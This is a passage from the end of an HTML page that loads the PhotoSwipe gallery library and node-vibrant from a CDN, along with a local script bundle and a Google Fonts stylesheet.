+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
